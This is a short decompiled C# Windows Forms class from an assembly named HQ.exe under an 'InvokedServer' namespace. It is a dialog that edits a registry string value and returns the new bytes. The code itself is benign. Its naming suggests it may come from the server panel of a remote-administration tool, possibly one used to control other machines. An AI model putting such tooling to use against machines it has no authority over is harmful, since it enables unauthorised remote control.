// Decompiled with JetBrains decompiler
// Type: InvokedServer.Forms.FrmRegValueEditString
// Assembly: HQ, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C53BC0E5-A85B-41E9-8105-FC74ED122A9A
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\HQ.exe

using System;
using System.Windows.Forms;
using InvokedCommon.Models;
using InvokedServer.Registry;


namespace InvokedServer.Forms
{
	public partial class FrmRegValueEditString : Form
	{
		private readonly RegValueData _value;

		public FrmRegValueEditString(RegValueData value)
		{
			this._value = value;
			this.InitializeComponent();
			this.valueNameTxtBox.Text = RegValueHelper.GetName(value.Name);
			this.valueDataTxtBox.Text = InvokedCommon.Utilities.ByteConverter.ToString(value.Data);
		}

		private void okButton_Click(object sender, EventArgs e)
		{
			this._value.Data = InvokedCommon.Utilities.ByteConverter.GetBytes(this.valueDataTxtBox.Text);
			this.Tag = (object)this._value;
			this.DialogResult = DialogResult.OK;
			this.Close();
		}
	}
}